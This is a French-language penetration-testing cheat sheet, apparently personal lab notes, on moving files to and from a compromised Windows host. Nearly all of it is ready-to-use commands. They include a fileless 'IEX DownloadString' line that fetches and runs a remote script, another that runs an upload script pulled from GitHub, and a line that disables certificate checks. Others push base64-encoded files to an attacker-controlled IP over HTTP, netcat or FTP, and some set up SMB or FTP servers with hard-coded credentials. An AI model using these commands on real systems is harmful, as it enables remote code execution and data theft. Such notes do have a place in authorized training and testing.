# Windows

## Download

Envoie de fichier en base64:

```bash
cat $fichier |base64 -w 0;echo
```

```powershell
[IO.File]::WriteAllBytes("C:\Users\Public\$fichier", [Convert]::FromBase64String("$base64"))
```

Télécharger un fichier en powershell:

```powershell
(New-Object Net.WebClient).DownloadFile('$url','$nomFichier')
(New-Object Net.WebClient).DownloadFileAsync('$url','$nomFichier')
```

Télécharger un fichier en mémoire et l'exécuter (fileless):

```powershell
IEX (New-Object Net.WebClient).DownloadString('$Url_Script.ps1')

ou

(New-Object Net.WebClient).DownloadString('$Url_Script.ps1') | IEX
```

Télécharger un fichier via Invoke-WebRequest (ou un de ses Alias: wget, curl, iwr):

```powershell
Invoke-WebRequest $url -OutFile $nomFichier
```

Bypasser un certificat untrusted:

```powershell
[System.Net.ServicePointManager]::ServerCertificateValidationCallback = {$true}
```

Réception d'un fichier via création d'un partage SMB:

```bash
sudo impacket-smbserver share -smb2support /tmp/smbshare -user t3st -password p4ssword
```

```powershell
net use n: \\$monip\share /user:t3st p4ssword
```

Réception d'un fichier via création d'un serveur FTP:

```bash
sudo pip3 install pyftpdlib
sudo python3 -m pyftpdlib --port 21
```

```powershell
(New-Object Net.WebClient).DownloadFile('ftp://$monIp/file.txt', 'ftp-file.txt')

Ou, en cas de shell non-interractif:

echo open $monIp > ftpcommand.txt
echo USER anonymous >> ftpcommand.txt
echo binary >> ftpcommand.txt
echo GET file.txt >> ftpcommand.txt
echo bye >> ftpcommand.txt
ftp -v -n -s:ftpcommand.txt
```

## Upload

Upload d'un fichier depuis windows en base64:

```powershell
[Convert]::ToBase64String((Get-Content -path "$fichier" -Encoding byte))
```

```bash
echo $base64 | base64 -d > $fichier
```

Upload d'un fichier via création d'un serveur d'upload:

```bash
pip3 install uploadserver
python3 -m uploadserver
```

```powershell
IEX(New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/juliourena/plaintext/master/Powershell/PSUpload.ps1')

Invoke-FileUpload -Uri http://$monIp:8000/upload -File $fichier
```

Upload d'un fichier en base64 via netcat:

```powershell
$b64 = [System.convert]::ToBase64String((Get-Content -Path '$fichier' -Encoding Byte))
Invoke-WebRequest -Uri http://$monIp:8000/ -Method POST -Body $b64
```

```bash
nc -lvnp 8000
echo $base64 | base64 -d -w 0 > $fichier
```

Upload d'un fichier via création d'un serveur FTP:

```bash
sudo python3 -m pyftpdlib --port 21 --write
```

```powershell
(New-Object Net.WebClient).UploadFile('ftp://$monIp/ftp-hosts', '$fichier')

Ou, en cas de shell non-interractif:

echo open $monIp > ftpcommand.txt
echo USER anonymous >> ftpcommand.txt
echo binary >> ftpcommand.txt
echo PUT $fichier >> ftpcommand.txt
echo bye >> ftpcommand.txt
ftp -v -n -s:ftpcommand.txt
```
